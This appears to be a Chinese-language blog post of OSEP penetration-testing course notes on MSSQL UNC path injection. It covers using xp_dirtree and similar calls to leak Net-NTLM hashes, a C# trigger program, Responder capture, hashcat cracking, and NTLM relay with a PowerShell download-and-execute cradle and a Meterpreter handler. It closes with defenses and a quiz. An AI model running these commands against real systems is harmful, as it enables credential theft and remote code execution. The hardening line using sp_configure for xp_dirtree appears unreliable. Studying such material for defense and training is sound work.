---
title: OSEP-15-UNC路径注入详解
description: '15-MSSQL攻击 | 03-UNC路径注入详解'
pubDate: 2026-01-30T00:02:26+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Exploit Development
  - SQL Injection
---

# UNC 路径注入攻击详解

## 写在前面

UNC 路径注入是一种强大的攻击技术，可以从低权限的数据库访问快速提升到操作系统级别的代码执行。本章详细讲解原理和实现。

---

## 一、攻击原理

### 1.1 什么是 UNC 路径？

```
UNC (Universal Naming Convention) 路径格式:
\\hostname\share\file

示例:
\\192.168.1.100\share\file.txt
\\server\c$\windows\system32
```

### 1.2 攻击流程

```
攻击流程:
┌─────────────────────────────────────────────────────────────┐
│  1. 攻击者获得低权限 SQL 访问                                │
│         ↓                                                   │
│  2. 执行 xp_dirtree 指向攻击者 SMB 服务器                    │
│         ↓                                                   │
│  3. SQL Server 服务账户尝试连接 SMB                          │
│         ↓                                                   │
│  4. 攻击者捕获 Net-NTLM 哈希                                 │
│         ↓                                                   │
│  5. 破解哈希或中继到其他服务器                               │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 为什么使用 IP 地址？

```
关键点:
- 使用 IP 地址时，Windows 自动回退到 NTLM 认证
- 使用主机名时，Windows 尝试 Kerberos 认证
- NTLM 认证可以被捕获和中继
- Kerberos 票据无法被中继
```

---

## 二、触发 SMB 连接的方法

### 2.1 xp_dirtree

```sql
-- 最常用的方法
EXEC master..xp_dirtree '\\192.168.119.120\share';

-- 带参数
EXEC master..xp_dirtree '\\192.168.119.120\share', 1, 1;
```

### 2.2 xp_fileexist

```sql
-- 检查文件是否存在
EXEC master..xp_fileexist '\\192.168.119.120\share\file.txt';
```

### 2.3 xp_subdirs

```sql
-- 列出子目录
EXEC master..xp_subdirs '\\192.168.119.120\share';
```

### 2.4 OPENROWSET

```sql
-- 使用 OPENROWSET
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=\\192.168.119.120\share;', 'SELECT 1');
```

### 2.5 BACKUP/RESTORE

```sql
-- 备份到 UNC 路径
BACKUP DATABASE master TO DISK = '\\192.168.119.120\share\backup.bak';
```

---

## 三、C# 实现代码

### 3.1 基础连接代码

```csharp
using System;
using System.Data.SqlClient;

namespace SQLUNCInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            // 目标 SQL Server
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            // 使用 Windows 集成认证
            String conString = "Server = " + sqlServer +
                             "; Database = " + database +
                             "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] 认证成功!");
            }
            catch
            {
                Console.WriteLine("[-] 认证失败");
                Environment.Exit(0);
            }

            // 执行 UNC 路径注入
            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            Console.WriteLine("[+] UNC 路径注入已执行");
            con.Close();
        }
    }
}
```

### 3.2 注意事项

```
C# 字符串转义:
- 双引号: \"
- 反斜杠: \\
- UNC 路径 \\server\share 变成 \\\\server\\share
```

---

## 四、使用 Responder 捕获哈希

### 4.1 启动 Responder

```bash
# 基本启动
sudo responder -I eth0

# 指定接口
sudo responder -I tap0

# 禁用某些服务
sudo responder -I eth0 --disable-ess
```

### 4.2 Responder 输出

```
[SMB] NTLMv2-SSP Client   : 192.168.120.5
[SMB] NTLMv2-SSP Username : corp1\SQLSvc
[SMB] NTLMv2-SSP Hash     : SQLSvc::corp1:00031db3ed40602b:A05501E7450025CF27120CE89BAF1C6E:0101000000000000...
```

### 4.3 哈希格式说明

```
Net-NTLMv2 哈希格式:
USERNAME::DOMAIN:CHALLENGE:RESPONSE:BLOB

示例:
SQLSvc::corp1:00031db3ed40602b:A05501E7450025CF27120CE89BAF1C6E:0101000000000000...
```

---

## 五、破解 Net-NTLM 哈希

### 5.1 使用 Hashcat

```bash
# 保存哈希到文件
echo "SQLSvc::corp1:00031db3ed40602b:A05501E7450025CF27120CE89BAF1C6E:0101000000000000..." > hash.txt

# 使用 Hashcat 破解 (模式 5600 = NetNTLMv2)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# 在虚拟机中需要 --force
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### 5.2 使用 John the Ripper

```bash
# 使用 John 破解
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 显示破解结果
john --show hash.txt
```

### 5.3 哈希类型对比

| 类型 | Hashcat 模式 | 说明 |
|------|-------------|------|
| NTLM | 1000 | Windows 本地哈希 |
| NetNTLMv1 | 5500 | 网络认证哈希 v1 |
| NetNTLMv2 | 5600 | 网络认证哈希 v2 |

---

## 六、NTLM 中继攻击

### 6.1 为什么需要中继？

```
场景:
- 密码太强无法破解
- 需要快速获得访问
- 服务账户是其他服务器的本地管理员

限制:
- 不能中继回源服务器 (同协议)
- 目标必须禁用 SMB 签名
- 域控默认启用 SMB 签名
```

### 6.2 使用 ntlmrelayx

```bash
# 基本用法 - 中继到目标服务器
impacket-ntlmrelayx -t smb://192.168.120.10 -smb2support

# 执行命令
impacket-ntlmrelayx -t smb://192.168.120.10 -smb2support -c "whoami"

# 执行 PowerShell
impacket-ntlmrelayx -t smb://192.168.120.10 -smb2support -c "powershell -enc <UTF16LE_BASE64>"
```

### 6.3 完整攻击流程

```bash
# 1. 准备 PowerShell payload
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)

# 2. 启动 Metasploit handler
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.119.120
set LPORT 443
run

# 3. 启动 ntlmrelayx
impacket-ntlmrelayx -t smb://192.168.120.10 -smb2support \
  -c "powershell -enc <UTF16LE_BASE64>"

# 4. 触发 UNC 路径注入
# 运行 C# 程序或执行 SQL 查询
```

---

## 七、实战示例

### 7.1 场景描述

```
环境:
- dc01.corp1.com: 域控 + SQL Server
- appsrv01.corp1.com: 应用服务器
- SQL 服务账户: SQLSvc (两台服务器的本地管理员)
- 攻击者: 普通域用户，可访问 SQL Server
```

### 7.2 攻击步骤

```
步骤 1: 枚举 SQL Server
┌─────────────────────────────────────────────────────────────┐
│  setspn -T corp1 -Q MSSQLSvc/*                              │
│  发现: dc01 和 appsrv01 都运行 SQL Server                    │
│  服务账户: SQLSvc (本地管理员)                               │
└─────────────────────────────────────────────────────────────┘

步骤 2: 测试 SQL 访问
┌─────────────────────────────────────────────────────────────┐
│  使用 Windows 集成认证连接 dc01                              │
│  确认有 public 角色访问权限                                  │
└─────────────────────────────────────────────────────────────┘

步骤 3: 捕获哈希
┌─────────────────────────────────────────────────────────────┐
│  启动 Responder                                             │
│  执行 xp_dirtree 指向攻击者 IP                               │
│  捕获 SQLSvc 的 Net-NTLMv2 哈希                              │
└─────────────────────────────────────────────────────────────┘

步骤 4a: 破解哈希
┌─────────────────────────────────────────────────────────────┐
│  hashcat -m 5600 hash.txt rockyou.txt                       │
│  获得密码: lab                                               │
│  使用密码登录 appsrv01                                       │
└─────────────────────────────────────────────────────────────┘

步骤 4b: 中继哈希 (替代方案)
┌─────────────────────────────────────────────────────────────┐
│  启动 ntlmrelayx 指向 appsrv01                               │
│  执行 xp_dirtree 触发连接                                    │
│  中继认证到 appsrv01                                         │
│  获得 SYSTEM shell                                           │
└─────────────────────────────────────────────────────────────┘
```

---

## 八、防御措施

### 8.1 SQL Server 加固

```sql
-- 禁用 xp_dirtree
EXEC sp_configure 'xp_dirtree', 0;
RECONFIGURE;

-- 使用最小权限服务账户
-- 不要让服务账户成为本地管理员
```

### 8.2 网络层防护

```
防护措施:
├── 启用 SMB 签名
├── 限制出站 SMB 连接
├── 使用防火墙阻止 445 端口出站
├── 监控异常 SMB 连接
└── 使用网络分段
```

### 8.3 监控检测

```
检测点:
├── 监控 xp_dirtree 调用
├── 监控 UNC 路径访问
├── 监控异常 SMB 连接
├── 监控服务账户活动
└── 审计 SQL Server 日志
```

---

## 九、练习题

### 选择题

1. UNC 路径注入使用 IP 地址而非主机名的原因是？
   - A) IP 更快
   - B) 强制使用 NTLM 认证
   - C) 绕过防火墙
   - D) 避免 DNS 解析

2. Net-NTLMv2 哈希的 Hashcat 模式是？
   - A) 1000
   - B) 5500
   - C) 5600
   - D) 3000

3. NTLM 中继攻击的限制是？
   - A) 只能中继到域控
   - B) 不能中继回源服务器
   - C) 需要管理员权限
   - D) 只支持 SMBv1

4. 哪个 SQL 存储过程可以触发 SMB 连接？
   - A) xp_cmdshell
   - B) xp_dirtree
   - C) sp_configure
   - D) sp_executesql

5. SMB 签名默认在哪里启用？
   - A) 所有服务器
   - B) 只有域控
   - C) 只有工作站
   - D) 默认禁用

### 答案

1-B, 2-C, 3-B, 4-B, 5-B

---

## 十、总结

### 关键要点

✅ UNC 路径注入可从低权限 SQL 访问获得系统级访问
✅ 使用 IP 地址强制 NTLM 认证
✅ Net-NTLM 哈希可以破解或中继
✅ 服务账户权限决定攻击影响范围
✅ SMB 签名可以防止中继攻击

### 攻击链总结

```
低权限 SQL 访问
      ↓
执行 xp_dirtree
      ↓
捕获 Net-NTLM 哈希
      ↓
破解密码 或 中继到其他服务器
      ↓
获得系统级访问
```

---

## 下一步

继续学习 [05-链接服务器攻击.md](/blog/osep/15-mssql攻击/05-链接服务器攻击/)，了解如何通过 SQL Server 链接进行横向移动。
